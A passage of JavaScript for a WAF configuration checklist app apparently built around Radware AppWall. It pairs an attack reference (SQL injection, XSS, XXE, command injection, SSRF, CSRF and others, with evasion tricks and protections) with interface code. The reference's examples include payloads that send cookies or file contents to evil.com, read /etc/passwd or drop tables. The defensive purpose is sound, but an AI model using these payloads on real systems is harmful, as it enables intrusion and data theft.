            description: 'Attackers insert malicious SQL code into application inputs to manipulate database queries.',
            examples: [
                "' OR 1=1 --",
                "'; DROP TABLE users; --",
                "' UNION SELECT username, password FROM users --"
            ],
            evasionTechniques: [
                'Encoding (URL, double, hex)',
                'Case alteration (SeLeCt)',
                'Comment injection (/**/)',
                'Alternate equivalents (char() instead of strings)',
                'Whitespace manipulation'
            ],
            protection: [
                'Input validation and sanitization',
                'Parameterized queries',
                'Least privilege database accounts',
                'WAF signatures for SQL patterns',
                'Application behavior monitoring'
            ]
        },
        'xss': {
            name: 'Cross-Site Scripting (XSS)',
            description: 'Attackers inject malicious JavaScript code into web pages, which executes in victim browsers.',
            examples: [
                "< script>alert('XSS')< /script>",
                "< img src=\"x\" onerror=\"alert('XSS')\">",
                "< body onload=\"fetch('https://evil.com?c='+document.cookie)\">"
            ],
            evasionTechniques: [
                'Encoding (HTML, JavaScript, URL, base64)',
                'Script obfuscation techniques',
                'Event handler variations',
                'Protocol-agnostic requests (//evil.com)',
                'Template injection'
            ],
            protection: [
                'Output encoding for context',
                'Content-Security-Policy headers',
                'Input validation',
                'XSS-specific WAF rules',
                'Modern framework protections'
            ]
        },
        'command-injection': {
            name: 'Command Injection',
            description: 'Attackers execute unauthorized system commands through vulnerable application inputs.',
            examples: [
                "; cat /etc/passwd",
                "| ls -la",
                "`whoami`",
                "$(id)"
            ],
            evasionTechniques: [
                'Command chaining (&&, ||, ;)',
                'Alternate encoding (hex, octal)',
                'Variable substitution',
                'Inline execution $(), ``',
                'Whitespace alternatives (${IFS})'
            ],
            protection: [
                'Input validation and sanitization',
                'Avoid system command execution',
                'Command whitelisting',
                'WAF signatures for command patterns',
                'Runtime application monitoring'
            ]
        },
        'xxe': {
            name: 'XML External Entity (XXE)',
            description: 'Attackers exploit vulnerable XML parsers to access files or execute code.',
            examples: [
                "<!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
                "<!DOCTYPE data [<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % eval \"<!ENTITY exfil SYSTEM 'http://evil.com/?x=%file;'>\">%eval;]><data>&exfil;</data>"
            ],
            evasionTechniques: [
                'Parameter entities',
                'Out-of-band data retrieval',
                'XML namespace abuse',
                'Custom entity definitions',
                'DTD loading from remote sources'
            ],
            protection: [
                'Disable external entities in XML parsers',
                'Disable DTD processing',
                'Use less complex data formats (JSON)',
                'WAF signatures for XXE patterns',
                'Input validation'
            ]
        },
        'path-traversal': {
            name: 'Path Traversal',
            description: 'Attackers access files outside the intended directory using relative path sequences.',
            examples: [
                "../../../etc/passwd",
                "....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
            ],
            evasionTechniques: [
                'Double encoding (%252e%252e%252f)',
                'Path normalization bypasses',
                'Non-standard path separators',
                'URL encoded sequences',
                'Null byte injection (file.txt%00.jpg)'
            ],
            protection: [
                'Input validation and sanitization',
                'Path canonicalization before validation',
                'Proper permission boundaries',
                'WAF signatures for path patterns',
                'Whitelisting allowed resources'
            ]
        },
        'ssrf': {
            name: 'Server-Side Request Forgery (SSRF)',
            description: 'Attackers force the server to make unintended requests to internal or external systems.',
            examples: [
                "http://internal-system/admin",
                "https://169.254.169.254/latest/meta-data/",
                "http://localhost:8080/admin"
            ],
            evasionTechniques: [
                'IP encoding variations (decimal, octal, hex)',
                'Domain redirections',
                'URL schema bypasses (gopher://, file://)',
                'DNS rebinding attacks',
                'Non-standard/enclosed IPv4 forms'
            ],
            protection: [
                'Whitelist allowed destinations',
                'Block internal networks/addresses',
                'DNS resolution validation',
                'Disable redirects or limit redirect chains',
                'HTTP library hardening'
            ]
        },
        'request-smuggling': {
            name: 'HTTP Request Smuggling',
            description: 'Attackers exploit differences in how front/backend servers process HTTP requests.',
            examples: [
                "Transfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n1\r\nZ\r\nQ",
                "Content-Length: 0\r\n\r\nGET /admin HTTP/1.1\r\nHost: example.com"
            ],
            evasionTechniques: [
                'CL.TE vs TE.CL vulnerability exploitation',
                'Obfuscated headers',
                'Chunked encoding variations',
                'Header smuggling techniques',
                'Line folding abuse'
            ],
            protection: [
                'Consistent HTTP parsing between servers',
                'HTTP request validation',
                'Strict protocol compliance',
                'Security headers',
                'Connection timeout settings'
            ]
        },
        'deserialization': {
            name: 'Insecure Deserialization',
            description: 'Attackers exploit flaws in how applications reconstruct data from serialized formats.',
            examples: [
                "O:8:\"Example\":1:{s:11:\"executeCode\";s:10:\"phpinfo();\"}",
                "{\"$type\":\"System.IO.FileInfo, System\",\"fileName\":\"C:/sensitive.txt\"}"
            ],
            evasionTechniques: [
                'Custom payload construction',
                'Gadget chain exploitation',
                'Nested serialized objects',
                'Type confusion attacks',
                'Format-specific obfuscation'
            ],
            protection: [
                'Avoid deserializing untrusted data',
                'Integrity checking (signatures/HMAC)',
                'Deserialization filtering',
                'Safe deserializer libraries',
                'Data type validation'
            ]
        },
        'csrf': {
            name: 'Cross-Site Request Forgery (CSRF)',
            description: 'Attackers trick users into making unwanted requests to websites where they\'re authenticated.',
            examples: [
                "<img src=\"https://bank.com/transfer?to=attacker&amount=1000\">",
                "<form id=\"csrf\" action=\"https://bank.com/transfer\" method=\"POST\"><input type=\"hidden\" name=\"to\" value=\"attacker\"><input type=\"hidden\" name=\"amount\" value=\"1000\"></form><script>document.getElementById(\"csrf\").submit()< /script>"
            ],
            evasionTechniques: [
                'XHR/fetch with custom headers',
                'Clickjacking for user interaction',
                'Same-site request initiation',
                'Flash/plugin-based cross-domain requests',
                'Timing attacks on token validation'
            ],
            protection: [
                'CSRF tokens',
                'SameSite cookie attribute',
                'Custom header validation',
                'Referrer checking',
                'Requiring user interaction for sensitive actions'
            ]
        },
        'clickjacking': {
            name: 'Clickjacking',
            description: 'Attackers trick users into clicking on hidden or disguised interface elements.',
            examples: [
                "<iframe src=\"https://bank.com/transfer\" style=\"opacity:0.1;position:absolute;z-index:2\"></iframe><button style=\"position:relative;z-index:1\">Click to Win</button>"
            ],
            evasionTechniques: [
                'Multiple nested iframes',
                'Opacity manipulation',
                'CSS z-index layering',
                'Timing-based tricks',
                'Drag and drop attacks'
            ],
            protection: [
                'X-Frame-Options header',
                'Content-Security-Policy (frame-ancestors)',
                'Frame-busting JavaScript',
                'Proper context validation',
                'User interaction confirmation'
            ]
        }
    },
    
    // Site-specific security configurations
    securityTemplates: [
        {
            name: "E-commerce Platform",
            description: "Protection tailored for online shopping applications with payments",
            priorities: [
                { category: "signatures", priority: "critical" },
                { category: "authentication", priority: "critical" },
                { category: "threat-protection", priority: "critical" },
                { category: "compliance", priority: "high" }
            ],
            focusAreas: [
                "PCI DSS compliance",
                "Credit card data protection",
                "Bot prevention for scalping/fraud",
                "API security for checkout process"
            ]
        },
        {
            name: "Banking Portal",
            description: "Maximum security for financial applications",
            priorities: [
                { category: "authentication", priority: "critical" },
                { category: "signatures", priority: "critical" },
                { category: "protocol", priority: "critical" },
                { category: "high-availability", priority: "critical" }
            ],
            focusAreas: [
                "Multi-factor authentication protection",
                "Transaction monitoring and validation",
                "Account takeover prevention",
                "Zero downtime operation"
            ]
        },
        {
            name: "Healthcare Application",
            description: "Protection for applications with sensitive health information",
            priorities: [
                { category: "authentication", priority: "critical" },
                { category: "compliance", priority: "critical" },
                { category: "signatures", priority: "high" },
                { category: "reporting", priority: "high" }
            ],
            focusAreas: [
                "HIPAA compliance",
                "PHI data leakage prevention",
                "Medical record access controls",
                "Comprehensive audit logging"
            ]
        }
    ]
};

// --- Initialization ---
document.addEventListener('DOMContentLoaded', initApp);

function initApp() {
    loadProjectsFromStorage();
    setupEventListeners();
    populateCategoryCards();
    populateFindingsTable();
    populateFindingCategoryOptions();
    updateProjectUI();
    updateProgressIndicators();
    setupSearchAndFiltering();
    console.log("Radware AppWall WAF Configuration Checklist Initialized");
}

// --- Event Listeners Setup ---
function setupEventListeners() {
    // Tab navigation
    document.querySelectorAll('.tab-link').forEach(tab => {
        tab.addEventListener('click', function(e) {
            e.preventDefault();
            const tabName = this.getAttribute('data-tab');
            changeTab(tabName);
        });
    });

    // Back button
    document.getElementById('btn-back')?.addEventListener('click', function(e) {
        e.preventDefault();
        closeCategory();
    });

    // Category cards event delegation
    document.getElementById('categories-container').addEventListener('click', function(e) {
        const categoryCard = e.target.closest('.category-card');
        if (categoryCard) {
            const categoryId = categoryCard.getAttribute('data-category');
            if (categoryId) {
                openCategory(categoryId);
            }
        }
    });

    // Modal close buttons
    document.querySelectorAll('.modal-close').forEach(btn => {
        btn.addEventListener('click', function() {
            const modal = this.closest('[id$="-modal"]');
            if (modal) toggleModal(modal.id, false);
        });
    });

    // Finding buttons
    document.getElementById('btn-add-finding')?.addEventListener('click', function() {
        openAddFindingModal();
    });

    document.getElementById('btn-save-finding')?.addEventListener('click', function() {
        saveFinding();
    });

    // Set up dynamic event delegation for tasks and other buttons added dynamically
    document.addEventListener('click', function(e) {
        // Task status buttons
        if (e.target.classList.contains('status-btn')) {
            const statusBtn = e.target;
            const taskItem = statusBtn.closest('.task-item');
            if (taskItem) {
                const taskId = taskItem.getAttribute('data-task-id');
                const status = statusBtn.getAttribute('data-status');
                updateTaskStatus(taskId, status);
                
                // Update button states
                taskItem.querySelectorAll('.status-btn').forEach(btn => {
                    btn.classList.remove('active');
                });
                statusBtn.classList.add('active');
            }
        }
        
        // Add finding buttons
        if (e.target.closest('.action-btn.add-finding')) {
            const btn = e.target.closest('.action-btn.add-finding');
            e.stopPropagation();
            const category = btn.getAttribute('data-category');
            openAddFindingModal(category);
        }
        
        // View findings buttons
        if (e.target.closest('.action-btn.view-findings')) {
            const btn = e.target.closest('.action-btn.view-findings');
            e.stopPropagation();
            const category = btn.getAttribute('data-category');
            openViewFindingModal(category);
        }
    });

    // Save notes button
    document.getElementById('btn-save-notes')?.addEventListener('click', function() {
        saveNotes();
    });

    // Report generation
    document.getElementById('btn-generate-report')?.addEventListener('click', function() {
        toggleModal('export-modal', true);
    });

    document.getElementById('btn-do-export')?.addEventListener('click', function() {
        exportReport();
    });

    // View and edit finding buttons
    document.getElementById('btn-edit-finding')?.addEventListener('click', function() {
        editCurrentFinding();
    });

    document.getElementById('btn-delete-finding')?.addEventListener('click', function() {
        confirmDeleteFinding();
    });

    document.getElementById('confirm-yes')?.addEventListener('click', function() {
        if (confirmCallback) {
            confirmCallback();
        }
        toggleModal('confirm-modal', false);
    });

    // Project management
    document.getElementById('btn-edit-project')?.addEventListener('click', function() {
        openEditProjectModal();
    });
    
    // Search and filter
    document.getElementById('search-input')?.addEventListener('input', function() {
        searchQuery = this.value.toLowerCase();
        applySearchAndFilter();
    });
    
    document.getElementById('filter-dropdown')?.addEventListener('change', function() {
        filterActive = this.value !== 'all';
        applySearchAndFilter();
    });
}

// --- Dynamic UI Rendering ---
function populateCategoryCards() {
    const container = document.getElementById('categories-container');
    if (!container) return;

    container.innerHTML = '';
    
    appwallData.categories.forEach(category => {
        const priorityClass = getPriorityClass(category.priority);
        const cardHTML = `
            <div class="category-card bg-white rounded-xl shadow-lg overflow-hidden border border-gray-100 transition duration-300 hover:shadow-xl transform hover:-translate-y-1 cursor-pointer" data-category="${category.id}">
                <div class="px-6 py-5 bg-radware-primary/5">
                    <span class="inline-flex items-center px-3 py-1 text-xs font-semibold ${priorityClass.bgClass} ${priorityClass.textClass} rounded-full">
                        ${capitalizeFirstLetter(category.priority)} Priority
                    </span>
                </div>
                <div class="p-6">
                    <div class="flex items-start gap-4 mb-4">
                        <div class="${priorityClass.bgSolid} text-white p-3 rounded-lg flex-shrink-0 shadow-md">
                            <i class="fas ${category.icon}"></i>
                        </div>
                        <h3 class="text-xl font-semibold text-gray-900">${category.title}</h3>
                    </div>
                    <p class="text-gray-600 mb-4 line-clamp-2">${category.subtitle}</p>
                    <div class="flex justify-between items-center pt-4 border-t border-gray-100">
                        <span class="bg-gray-100 text-gray-700 px-3 py-1 rounded-full text-sm font-medium" id="${category.id}-progress">${category.progress}% complete</span>
                        <span class="text-radware-primary font-semibold text-sm flex items-center gap-1 hover:text-radware-secondary transition-colors">
                            View settings <i class="fas fa-arrow-right text-xs"></i>
                        </span>
                    </div>
                </div>
            </div>
        `;
        
        container.innerHTML += cardHTML;
    });
}

function populateFindingsTable() {
    const tableBody = document.getElementById('findings-table-body');
    if (!tableBody) return;
    
    tableBody.innerHTML = '';
    
    // Create a map of findings by category
    const findingsByCategory = {};
    
    appwallData.findings.forEach(finding => {
        if (!findingsByCategory[finding.category]) {
            findingsByCategory[finding.category] = {
                high: 0,
                medium: 0,
                low: 0,
                info: 0
            };
        }
        
        findingsByCategory[finding.category][finding.severity]++;
    });
    
    // Populate the table
    Object.keys(findingsByCategory).forEach(categoryId => {
        const category = appwallData.categories.find(c => c.id === categoryId);
        if (!category) return;
        
        const counts = findingsByCategory[categoryId];
        const total = counts.high + counts.medium + counts.low + counts.info;
        
        const rowHTML = `
            <tr>
                <td class="px-5 py-4 border-b border-gray-200">${category.title}</td>
                <td class="px-5 py-4 border-b border-gray-200 text-center ${counts.high > 0 ? 'text-status-critical font-semibold' : ''}">${counts.high}</td>
                <td class="px-5 py-4 border-b border-gray-200 text-center ${counts.medium > 0 ? 'text-status-high font-semibold' : ''}">${counts.medium}</td>
                <td class="px-5 py-4 border-b border-gray-200 text-center ${counts.low > 0 ? 'text-status-medium font-semibold' : ''}">${counts.low}</td>
                <td class="px-5 py-4 border-b border-gray-200 text-center ${counts.info > 0 ? 'text-radware-primary font-semibold' : ''}">${counts.info}</td>
                <td class="px-5 py-4 border-b border-gray-200 text-center font-semibold">${total}</td>
                <td class="px-5 py-4 border-b border-gray-200">
                    <div class="flex gap-2">
                        <button class="action-btn add-finding text-radware-primary hover:text-radware-secondary hover:bg-radware-primary/10 px-3 py-2 rounded-md transition" data-category="${categoryId}">
                            <i class="fas fa-plus"></i> <span class="hidden sm:inline">Add</span>
                        </button>
                        <button class="action-btn view-findings text-radware-primary hover:text-radware-secondary hover:bg-radware-primary/10 px-3 py-2 rounded-md transition" data-category="${categoryId}">
                            <i class="fas fa-eye"></i> <span class="hidden sm:inline">View (${total})</span>
                        </button>
                    </div>
                </td>
            </tr>
        `;
        
        tableBody.innerHTML += rowHTML;
    });
}

function populateFindingCategoryOptions() {
    const categorySelect = document.getElementById('finding-category');
    if (!categorySelect) return;
    
    categorySelect.innerHTML = '';
    
    appwallData.categories.forEach(category => {
        const option = document.createElement('option');
        option.value = category.id;
        option.textContent = category.title;
        categorySelect.appendChild(option);
    });
}

function renderCategoryChecklist(categoryId) {
    const category = appwallData.categories.find(c => c.id === categoryId);
    if (!category) return;
    
    const checklistTab = document.getElementById('checklist-tab');
    if (!checklistTab) return;
    
    checklistTab.innerHTML = '';
    
    category.checklist.forEach(group => {
        let groupHTML = `
            <div class="mb-8 rounded-lg overflow-hidden border border-gray-200 shadow-lg">
                <h3 class="checklist-group-title bg-gray-100 p-4 border-b border-gray-200 font-semibold flex items-center gap-2">
                    <i class="fas ${group.icon} text-radware-primary"></i>
                    ${group.title}
                </h3>
        `;
        
        group.items.forEach((item, index) => {
            const isLast = index === group.items.length - 1;
            const priorityClass = getPriorityIndicator(item.priority);
            
            groupHTML += `
                <div class="task-item flex items-start p-4 ${isLast ? '' : 'border-b border-gray-200'} hover:bg-gray-50" data-task-id="${item.id}" data-priority="${item.priority}">
                    <div class="task-status mr-3 mt-1">
                        <div class="status-controls">
                            <button type="button" class="status-btn active" data-status="not-tested" aria-label="Mark as not tested">â</button>
                            <button type="button" class="status-btn" data-status="passed" aria-label="Mark as passed">â</button>
                            <button type="button" class="status-btn na" data-status="na" aria-label="Mark as not applicable">N/A</button>
                        </div>
                    </div>
                    <div class="task-text flex-1">
                        <span class="flex items-center gap-2">
                            ${item.text}
                            ${priorityClass ? `<span class="inline-block h-2 w-2 ${priorityClass} rounded-full" title="${capitalizeFirstLetter(item.priority)} priority"></span>` : ''}
                        </span>
                    </div>
                </div>
            `;
        });
        
        groupHTML += `</div>`;
        checklistTab.innerHTML += groupHTML;
    });
    
    // Update task status from saved project data
    updateTaskStatusFromProject();
}

function renderCategoryTechniques(categoryId) {
    const category = appwallData.categories.find(c => c.id === categoryId);
    if (!category || !category.techniques) return;
    
    const techniquesTab = document.getElementById('techniques-tab');
    if (!techniquesTab) return;
    
    techniquesTab.innerHTML = '<div class="space-y-8"></div>';
    const container = techniquesTab.querySelector('.space-y-8');
    
    category.techniques.forEach(technique => {
        const techniqueHTML = `
            <div class="bg-white rounded-lg border border-gray-200 shadow-lg overflow-hidden">
                <h4 class="text-lg font-semibold p-5 border-b border-gray-200 flex items-center gap-2">
                    <span class="w-2 h-2 bg-radware-accent rounded-full inline-block"></span>
                    ${technique.title}
                </h4>
                <div class="p-5">
                    ${technique.content}
                </div>
            </div>
        `;
        
        container.innerHTML += techniqueHTML;
    });
}

function renderCategoryTools(categoryId) {
    const category = appwallData.categories.find(c => c.id === categoryId);
    if (!category || !category.tools) return;
    
    const toolsTab = document.getElementById('tools-tab');
    if (!toolsTab) return;
    
    toolsTab.innerHTML = '<div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6"></div>';
    const container = toolsTab.querySelector('.grid');
    
    category.tools.forEach(tool => {
        const toolHTML = `
            <div class="bg-white rounded-lg border border-gray-200 shadow-lg overflow-hidden transition duration-300 hover:shadow-xl transform hover:-translate-y-1">
                <div class="p-5 border-b border-gray-200">
                    <div class="flex gap-4">
                        <div class="bg-gradient-to-r from-radware-primary to-radware-secondary p-3 rounded-lg text-white text-xl shadow-md">
                            <i class="fas ${tool.icon}"></i>
                        </div>
                        <h4 class="text-lg font-semibold text-gray-900">${tool.title}</h4>
                    </div>
                </div>
                <div class="p-5">
                    <p class="text-gray-700 mb-4 min-h-[72px]">${tool.description}</p>
                    <a href="${tool.link}" target="_blank" class="bg-gradient-to-r from-radware-primary to-radware-secondary text-white px-4 py-2 rounded-full inline-flex items-center gap-2 shadow-md hover:shadow-lg transition">
                        <span>${tool.linkText}</span>
                        <i class="fas fa-external-link-alt text-xs"></i>
                    </a>
                </div>
            </div>
        `;
        
        container.innerHTML += toolHTML;
    });
}

function openViewFindingModal(categoryId) {
    // In a real app, you would show findings for the specific category
    // For this demo, we'll show the first finding from the category
    const finding = appwallData.findings.find(f => f.category === categoryId);
    if (!finding) return;
    
    const modalTitle = document.getElementById('view-finding-title');
    const modalContent = document.getElementById('view-finding-content');
    
    if (modalTitle) modalTitle.textContent = 'Configuration Issue Details';
    
    if (modalContent) {
        const severityClass = getSeverityClasses(finding.severity);
        
        modalContent.innerHTML = `
            <div class="flex items-center gap-3 mb-4">
                <span class="inline-flex items-center px-3 py-1 text-xs font-semibold ${severityClass.bgClass} ${severityClass.textClass} rounded-full">
                    ${capitalizeFirstLetter(finding.severity)} Severity
                </span>
                <span class="text-sm text-gray-500">Category: ${getCategoryTitle(finding.category)}</span>
            </div>
            
            <div>
                <h4 class="text-lg font-semibold mb-2">${finding.title}</h4>
                <div class="bg-gray-50 rounded-lg p-4 mb-4">
                    <p>${finding.description}</p>
                </div>
            </div>
            
            <div>
                <h4 class="text-base font-semibold mb-2">Recommended Remediation</h4>
                <div class="bg-gray-50 rounded-lg p-4 mb-4">
                    <p>${finding.remediation}</p>
                </div>
            </div>
            
            <div>
                <h4 class="text-base font-semibold mb-2">Configuration Commands</h4>
                <div class="code-block">
                    ${formatConfigCommands(finding.config)}
                </div>
            </div>
        `;
    }
    
    // Store current finding ID for edit/delete operations
    currentEditingFindingId = finding.id;
    
    toggleModal('view-finding-modal', true);
}

// --- Modal Management ---
function toggleModal(modalId, show) {
    const modal = document.getElementById(modalId);
    if (!modal) return;
    
    if (show) {
        modal.classList.remove('hidden');
    } else {
        modal.classList.add('hidden');
    }
}

function openAddFindingModal(categoryId = null) {
    const modal = document.getElementById('finding-modal');
    const categorySelect = document.getElementById('finding-category');
    const modalTitle = document.getElementById('finding-modal-title');
    
    if (modalTitle) {
        modalTitle.textContent = currentEditingFindingId ? 'Edit Configuration Issue' : 'Add Configuration Issue';
    }
    
    if (modal && categorySelect && categoryId) {
        categorySelect.value = categoryId;
    }
    
    // If editing an existing finding, populate the form
    if (currentEditingFindingId) {
        const finding = appwallData.findings.find(f => f.id === currentEditingFindingId);
        if (finding) {
            document.getElementById('finding-title').value = finding.title;
            document.getElementById('finding-severity').value = finding.severity;
            document.getElementById('finding-description').value = finding.description;
            document.getElementById('finding-remediation').value = finding.remediation;
            document.getElementById('finding-config').value = finding.config;
            if (categorySelect) categorySelect.value = finding.category;
        }
    } else {
        // Clear the form for new findings
        document.getElementById('finding-title').value = '';
        document.getElementById('finding-description').value = '';
        document.getElementById('finding-remediation').value = '';
        document.getElementById('finding-config').value = '';
    }
    
    toggleModal('finding-modal', true);
}

function openEditProjectModal() {
    if (!currentProject) return;
    
    // In a real implementation, populate the form with current project details
    // and open a modal to edit them
    
    showToast('Project editing functionality would be implemented here', 'info');
}

function saveFinding() {
    const title = document.getElementById('finding-title').value;
    const category = document.getElementById('finding-category').value;
    const severity = document.getElementById('finding-severity').value;
    const description = document.getElementById('finding-description').value;
    const remediation = document.getElementById('finding-remediation').value;
    const config = document.getElementById('finding-config').value;
    
    if (!title || !category || !severity) {
        showToast('Please fill in all required fields', 'error');
        return;
    }
    
    if (currentEditingFindingId) {
        // Update existing finding
        const findingIndex = appwallData.findings.findIndex(f => f.id === currentEditingFindingId);
        if (findingIndex !== -1) {
            appwallData.findings[findingIndex] = {
                id: currentEditingFindingId,
                title,
                category,
                severity,
                description,
                remediation,
                config
            };
            
            // Clone findings to project storage
            if (currentProject) {
                currentProject.findingDetails = [...appwallData.findings];
                saveProjectToStorage();
            }
            
            showToast('Configuration issue updated successfully', 'success');
        }
    } else {
        // Add new finding
        const newFinding = {
            id: 'finding-' + Date.now(),
            title,
            category,
            severity,
            description,
            remediation,
            config
        };
        
        appwallData.findings.push(newFinding);
        
        // Clone findings to project storage
        if (currentProject) {
            currentProject.findingDetails = [...appwallData.findings];
            saveProjectToStorage();
        }
        
        showToast('Configuration issue saved successfully', 'success');
    }
    
    // Reset current editing state
    currentEditingFindingId = null;
    
    // Update findings table
    populateFindingsTable();
    
    toggleModal('finding-modal', false);
}

function editCurrentFinding() {
    if (currentEditingFindingId) {
        toggleModal('view-finding-modal', false);
        openAddFindingModal();
    }
}

function confirmDeleteFinding() {
    if (!currentEditingFindingId) return;
    
    document.getElementById('confirm-message').textContent = 'Are you sure you want to delete this configuration issue? This action cannot be undone.';
    
    confirmCallback = () => {
        const findingIndex = appwallData.findings.findIndex(f => f.id === currentEditingFindingId);
        if (findingIndex !== -1) {
            appwallData.findings.splice(findingIndex, 1);
            
            // Update project storage
            if (currentProject) {
                currentProject.findingDetails = [...appwallData.findings];
                saveProjectToStorage();
            }
            
            showToast('Configuration issue deleted successfully', 'success');
            populateFindingsTable();
            toggleModal('view-finding-modal', false);
            currentEditingFindingId = null;
        }
    };
    
    toggleModal('confirm-modal', true);
}

// --- Category Management ---
function openCategory(categoryId) {
    currentCategory = categoryId;
    
    // Initialize category data if needed
    initializeCategoryData(categoryId);
    
    // Show category details section
    document.getElementById('categories-section').style.display = 'none';
    document.getElementById('category-details').style.display = 'block';
    
    // Update header
    document.getElementById('details-title').textContent = getCategoryTitle(categoryId);
    document.getElementById('details-subtitle').textContent = getCategorySubtitle(categoryId);
    
    // Render category content
    renderCategoryChecklist(categoryId);
    renderCategoryTechniques(categoryId);
    renderCategoryTools(categoryId);
    
    // Load notes if available
    loadCategoryNotes(categoryId);
    
    // Set active tab
    changeTab('checklist');
    
    // Scroll to top
    window.scrollTo(0, 0);
}

function closeCategory() {
    document.getElementById('categories-section').style.display = 'block';
    document.getElementById('category-details').style.display = 'none';
    currentCategory = '';
}

function changeTab(tabName) {
    // Hide all tabs
    document.querySelectorAll('.tab-content').forEach(tab => {
        tab.classList.add('hidden');
    });
    
    // Remove active class from all tab links
    document.querySelectorAll('.tab-link').forEach(link => {
        link.classList.remove('active');
    });
    
    // Show selected tab
    const selectedTab = document.getElementById(tabName + '-tab');
    if (selectedTab) {
        selectedTab.classList.remove('hidden');
    }
    
    // Add active class to selected tab link
    const selectedLink = document.querySelector(`.tab-link[data-tab="${tabName}"]`);
    if (selectedLink) {
        selectedLink.classList.add('active');
    }
}

// --- Task Status Management ---
function updateTaskStatus(taskId, status) {
    if (!taskId || !status || !currentProject) return;
    
    // Initialize taskStatus if it doesn't exist
    if (!currentProject.taskStatus) {
        currentProject.taskStatus = {};
    }
    
    // Update the task status
    currentProject.taskStatus[taskId] = status;
    
    // Save project and update progress indicators
    saveProjectToStorage();
    updateProgressIndicators();
    showToast('Task status updated', 'success');
}

function updateTaskStatusFromProject() {
    if (!currentProject || !currentProject.taskStatus) return;
    
    // For each saved task status, update the UI
    Object.entries(currentProject.taskStatus).forEach(([taskId, status]) => {
        const taskItem = document.querySelector(`.task-item[data-task-id="${taskId}"]`);
        if (taskItem) {
            const statusBtns = taskItem.querySelectorAll('.status-btn');
            statusBtns.forEach(btn => {
                btn.classList.remove('active');
                if (btn.getAttribute('data-status') === status) {
                    btn.classList.add('active');
                }
            });
        }
    });
}

// --- Notes Management ---
function saveNotes() {
    if (!currentCategory || !currentProject) return;
    
    const notesTextarea = document.getElementById('category-notes');
    if (!notesTextarea) return;
    
    // Initialize notes object if it doesn't exist
    if (!currentProject.notes) {
        currentProject.notes = {};
    }
    
    // Save notes for current category
    currentProject.notes[currentCategory] = notesTextarea.value;
    
    // Save project
    saveProjectToStorage();
    showToast('Notes saved successfully', 'success');
}

function loadCategoryNotes(categoryId) {
    if (!categoryId || !currentProject || !currentProject.notes) return;
    
    const notesTextarea = document.getElementById('category-notes');
    if (notesTextarea) {
        notesTextarea.value = currentProject.notes[categoryId] || '';
    }
}

// --- Report Export ---
function exportReport() {
    const format = document.getElementById('export-format').value;
    const detail = document.getElementById('export-detail').value;
    const includeNotes = document.getElementById('export-include-notes').checked;
    
    // In a real app, this would generate and save the report in the selected format
    // For demo purposes, just show a toast message
    
    showToast(`Report export initiated in ${format} format with ${detail} detail level`, 'success');
    toggleModal('export-modal', false);
}

// --- Progress Indicators ---
function updateProgressIndicators() {
    if (!currentProject || !currentProject.taskStatus) return;
    
    // Calculate progress for each category and overall progress
    const taskStatuses = currentProject.taskStatus;
    const categoryStats = {};
    let totalTasks = 0;
    let completedTasks = 0;
    let criticalTotal = 0;
    let criticalCompleted = 0;
    let highTotal = 0;
    let highCompleted = 0;
    let mediumTotal = 0;
    let mediumCompleted = 0;
    
    // Count all tasks and completions
    appwallData.categories.forEach(category => {
        categoryStats[category.id] = { total: 0, completed: 0 };
        
        category.checklist.forEach(group => {
            group.items.forEach(item => {
                totalTasks++;
                categoryStats[category.id].total++;
                
                if (item.priority === 'critical') criticalTotal++;
                if (item.priority === 'high') highTotal++;
                if (item.priority === 'medium') mediumTotal++;
                
                const status = taskStatuses[item.id];
                if (status === TASK_STATUS.PASSED) {
                    completedTasks++;
                    categoryStats[category.id].completed++;
                    
                    if (item.priority === 'critical') criticalCompleted++;
                    if (item.priority === 'high') highCompleted++;
                    if (item.priority === 'medium') mediumCompleted++;
                }
            });
        });
    });
    
    // Update overall progress
    const overallPercent = Math.round((completedTasks / totalTasks) * 100) || 0;
    document.getElementById('overall-progress').textContent = `${overallPercent}%`;
    document.getElementById('overall-progress-bar').style.width = `${overallPercent}%`;
    
    // Update priority progress
    const criticalPercent = Math.round((criticalCompleted / criticalTotal) * 100) || 0;
    document.getElementById('critical-progress').textContent = `${criticalCompleted}/${criticalTotal}`;
    document.getElementById('critical-progress-bar').style.width = `${criticalPercent}%`;
    
    const highPercent = Math.round((highCompleted / highTotal) * 100) || 0;
    document.getElementById('high-progress').textContent = `${highCompleted}/${highTotal}`;
    document.getElementById('high-progress-bar').style.width = `${highPercent}%`;
    
    const mediumPercent = Math.round((mediumCompleted / mediumTotal) * 100) || 0;
    document.getElementById('medium-progress').textContent = `${mediumCompleted}/${mediumTotal}`;
    document.getElementById('medium-progress-bar').style.width = `${mediumPercent}%`;
    
    // Update category progress
    Object.entries(categoryStats).forEach(([categoryId, stats]) => {
        const percent = Math.round((stats.completed / stats.total) * 100) || 0;
        const progressElement = document.getElementById(`${categoryId}-progress`);
        if (progressElement) {
            progressElement.textContent = `${percent}% complete`;
        }
        
        // Update the stored progress in appwallData (for new renderings)
        const category = appwallData.categories.find(c => c.id === categoryId);
        if (category) {
            category.progress = percent;
        }
    });
    
    // Update last updated timestamp
    if (currentProject) {
        currentProject.lastUpdated = new Date().toISOString();
        document.getElementById('project-updated').textContent = formatDate(currentProject.lastUpdated);
    }
}

// --- Search and Filtering ---
function setupSearchAndFiltering() {
    // This would add search and filter UI to the page in a real implementation
    // For example, adding a search input and filter dropdown in the appropriate sections
}

function applySearchAndFilter() {
    if (!currentCategory) {
        // If on main dashboard, filter the category cards
        filterCategoryCards();
    } else {
        // If in a specific category, filter the tasks
        filterTaskItems();
    }
}

function filterCategoryCards() {
    const cards = document.querySelectorAll('.category-card');
    
    cards.forEach(card => {
        const categoryId = card.getAttribute('data-category');
        const category = appwallData.categories.find(c => c.id === categoryId);
        
        if (!category) return;
        
        const titleMatch = category.title.toLowerCase().includes(searchQuery);
        const subtitleMatch = category.subtitle.toLowerCase().includes(searchQuery);
        const priorityMatch = !filterActive || category.priority === document.getElementById('filter-dropdown')?.value;
        
        if ((titleMatch || subtitleMatch) && priorityMatch) {
            card.style.display = 'block';
        } else {
            card.style.display = 'none';
        }
    });
}

function filterTaskItems() {
    const tasks = document.querySelectorAll('.task-item');
    
    tasks.forEach(task => {
